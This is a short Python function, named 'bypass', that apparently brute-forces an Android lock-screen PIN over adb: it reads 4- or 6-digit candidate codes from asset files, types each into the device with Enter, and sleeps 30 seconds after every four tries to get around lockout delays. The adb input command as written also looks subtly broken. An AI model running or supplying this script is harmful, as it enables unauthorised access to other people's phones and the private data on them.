
def bypass(flag):
    current_file = os.path.realpath(__file__)
    script_dir = os.path.dirname(current_file)
    if flag == 4:
        length = "four.txt"
    elif flag == 6:
        length = "six.txt"
    rel_path = f"assets/{length}"
    abs_file_path = os.path.join(script_dir, rel_path)
    with open(abs_file_path, 'r') as file:
        numbers = file.read().splitlines()

    for i, number in enumerate(numbers):
        if i % 4 == 0 and i != 0:
            time.sleep(30)
        command = f"adb shell input {number} && adb shell input keyevent 66"
        subprocess.run(command, shell=True, check=True)
